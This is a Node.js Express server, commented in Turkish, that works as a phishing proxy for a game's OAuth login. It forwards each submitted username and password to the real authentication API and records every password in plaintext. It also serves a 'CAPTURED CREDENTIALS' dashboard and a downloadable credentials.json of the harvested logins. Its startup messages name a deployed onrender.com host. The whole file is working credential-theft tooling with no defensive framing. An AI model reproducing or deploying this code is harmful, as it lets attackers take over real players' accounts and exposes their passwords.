const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs').promises;
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3001;
const DATA_FILE = path.join('/tmp', 'login-attempts.json');

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Static files
app.use(express.static(path.join(__dirname, '../dist')));

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

// Root endpoint
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../dist/index.html'));
});

// Veri dosyasını oluştur
async function initDataFile() {
  try {
    await fs.access(DATA_FILE);
  } catch {
    await fs.writeFile(DATA_FILE, JSON.stringify([]));
  }
}

// Login denemelerini oku
async function readLoginAttempts() {
  try {
    const data = await fs.readFile(DATA_FILE, 'utf8');
    return JSON.parse(data);
  } catch {
    return [];
  }
}

// Login denemelerini kaydet
async function saveLoginAttempt(username, password, success = false) {
  const attempts = await readLoginAttempts();
  const newAttempt = {
    id: crypto.randomUUID(),
    username,
    password,
    timestamp: new Date().toISOString(),
    success
  };
  
  attempts.unshift(newAttempt);
  
  // Son 100 denemeyi tut
  if (attempts.length > 100) {
    attempts.splice(100);
  }
  
  await fs.writeFile(DATA_FILE, JSON.stringify(attempts, null, 2));
  return newAttempt;
}

// OAuth token proxy endpoint
app.post('/api/oauth/token', async (req, res) => {
  const { username, password } = req.body;
  
  console.log('🔐 Login attempt captured:', {
    username: username || 'N/A',
    password: password ? '****' : 'N/A',
    timestamp: new Date().toISOString()
  });
  
  let success = false;
  let responseData = null;
  
  try {
    // Gerçek API'ye forward et
    const fetch = await import('node-fetch').then(module => module.default);
    
    const formData = new URLSearchParams({
      client_id: 'unity.client',
      client_secret: 'secret',
      grant_type: 'password',
      scope: 'openid nebula offline_access',
      username: username || '',
      password: password || '',
      acr_values: 'gameId:j68d'
    });
    
    const response = await fetch('https://eu-secure.mspapis.com/loginidentity/connect/token', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: formData
    });
    
    responseData = await response.json();
    success = response.ok && responseData.access_token;
    
    console.log('✅ API Response:', response.ok ? 'Success' : 'Failed');
    
  } catch (error) {
    console.error('❌ API Error:', error.message);
    responseData = { error: 'connection_error', error_description: 'Failed to connect to authentication server' };
  }
  
  // Kullanıcı bilgilerini kaydet
  if (username && password) {
    await saveLoginAttempt(username, password, success);
  }
  
  // Response'u döndür
  res.json(responseData);
});

// Test bağlantısı endpoint'i
app.post('/api/test-connection', async (req, res) => {
  const { username, password } = req.body;
  
  try {
    await saveLoginAttempt(username, password, true);
    res.json({ success: true, message: 'Test connection successful' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Login denemelerini getir
app.get('/api/login-attempts', async (req, res) => {
  try {
    const attempts = await readLoginAttempts();
    res.json(attempts);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// JSON formatında tüm verileri görüntüle (web sayfası)
app.get('/json', async (req, res) => {
  try {
    const attempts = await readLoginAttempts();
    
    // Sadece username ve password bilgilerini al
    const credentials = attempts.map(attempt => ({
      username: attempt.username,
      password: attempt.password,
      timestamp: attempt.timestamp,
      success: attempt.success
    }));
    
    const html = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Captured Credentials - JSON View</title>
        <style>
            body {
                font-family: 'Courier New', monospace;
                background: #1a1a1a;
                color: #00ff00;
                margin: 0;
                padding: 20px;
                line-height: 1.6;
            }
            .container {
                max-width: 1200px;
                margin: 0 auto;
            }
            .header {
                text-align: center;
                margin-bottom: 30px;
                padding: 20px;
                border: 2px solid #00ff00;
                border-radius: 10px;
                background: rgba(0, 255, 0, 0.1);
            }
            .json-container {
                background: #000;
                border: 1px solid #333;
                border-radius: 8px;
                padding: 20px;
                overflow-x: auto;
                white-space: pre-wrap;
                font-size: 14px;
            }
            .stats {
                display: flex;
                justify-content: space-around;
                margin-bottom: 20px;
                flex-wrap: wrap;
            }
            .stat-box {
                background: rgba(0, 255, 0, 0.1);
                border: 1px solid #00ff00;
                padding: 15px;
                border-radius: 8px;
                text-align: center;
                margin: 5px;
                min-width: 150px;
            }
            .refresh-btn {
                background: #00ff00;
                color: #000;
                border: none;
                padding: 10px 20px;
                border-radius: 5px;
                cursor: pointer;
                font-weight: bold;
                margin: 10px;
            }
            .refresh-btn:hover {
                background: #00cc00;
            }
            .copy-btn {
                background: #0066ff;
                color: white;
                border: none;
                padding: 8px 16px;
                border-radius: 5px;
                cursor: pointer;
                margin-bottom: 10px;
            }
            .copy-btn:hover {
                background: #0052cc;
            }
            @media (max-width: 768px) {
                .stats {
                    flex-direction: column;
                }
                .json-container {
                    font-size: 12px;
                }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔐 CAPTURED CREDENTIALS</h1>
                <p>OAuth Token Proxy - JSON Data View</p>
                <button class="refresh-btn" onclick="window.location.reload()">🔄 Refresh Data</button>
            </div>
            
            <div class="stats">
                <div class="stat-box">
                    <h3>Total Attempts</h3>
                    <div style="font-size: 24px; font-weight: bold;">${credentials.length}</div>
                </div>
                <div class="stat-box">
                    <h3>Successful</h3>
                    <div style="font-size: 24px; font-weight: bold; color: #00ff00;">${credentials.filter(c => c.success).length}</div>
                </div>
                <div class="stat-box">
                    <h3>Failed</h3>
                    <div style="font-size: 24px; font-weight: bold; color: #ff6666;">${credentials.filter(c => !c.success).length}</div>
                </div>
                <div class="stat-box">
                    <h3>Last Update</h3>
                    <div style="font-size: 14px;">${new Date().toLocaleString()}</div>
                </div>
            </div>
            
            <button class="copy-btn" onclick="copyToClipboard()">📋 Copy JSON</button>
            
            <div class="json-container" id="jsonData">${JSON.stringify(credentials, null, 2)}</div>
        </div>
        
        <script>
            function copyToClipboard() {
                const jsonData = document.getElementById('jsonData').textContent;
                navigator.clipboard.writeText(jsonData).then(function() {
                    alert('JSON data copied to clipboard!');
                }, function(err) {
                    console.error('Could not copy text: ', err);
                });
            }
            
            // Auto refresh every 30 seconds
            setTimeout(function() {
                window.location.reload();
            }, 30000);
        </script>
    </body>
    </html>
    `;
    
    res.send(html);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Raw JSON endpoint (sadece JSON data)
app.get('/api/credentials.json', async (req, res) => {
  try {
    const attempts = await readLoginAttempts();
    
    // Sadece username ve password bilgilerini al
    const credentials = attempts.map(attempt => ({
      username: attempt.username,
      password: attempt.password,
      timestamp: attempt.timestamp,
      success: attempt.success
    }));
    
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', 'attachment; filename="credentials.json"');
    res.json(credentials);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
// Frontend için catch-all route
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../dist/index.html'));
});

// Sunucuyu başlat
async function startServer() {
  await initDataFile();
  
  app.listen(PORT, () => {
    console.log(`🚀 OAuth Proxy Server running on port ${PORT}`);
    console.log(`📊 Dashboard: https://accounts-vxlw.onrender.com`);
    console.log(`🔗 Proxy endpoint: https://accounts-vxlw.onrender.com/api/oauth/token`);
    console.log('');
    console.log('📝 Usage:');
    console.log('POST /api/oauth/token with username & password in body');
    console.log('All login attempts will be captured and logged');
  });
  
  // Graceful shutdown
  process.on('SIGTERM', () => {
    console.log('SIGTERM received, shutting down gracefully');
    process.exit(0);
  });
}

startServer().catch(console.error);
